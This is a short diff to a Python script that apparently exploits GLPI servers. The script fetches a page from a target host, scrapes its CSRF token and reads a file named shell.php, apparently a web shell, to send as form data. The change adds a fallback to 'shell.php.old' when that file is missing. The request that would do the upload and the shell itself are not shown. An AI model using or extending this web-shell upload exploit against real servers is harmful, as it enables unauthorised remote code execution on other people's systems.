@@ -9,6 +9,7 @@
 import requests
 import re
 import argparse
+import os
 
 parser = argparse.ArgumentParser()
 parser.add_argument('host')
@@ -21,7 +22,11 @@ search = re.search('glpi:csrf_token" content="([^"]+)"', r.text)
 
 csrf = search.group(1)
 
-with open('shell.php', 'r') as f:
+payload_path = 'shell.php'
+if not os.path.exists(payload_path):
+    payload_path = 'shell.php.old'
+
+with open(payload_path, 'r') as f:
     content = f.read()
 
 data = {
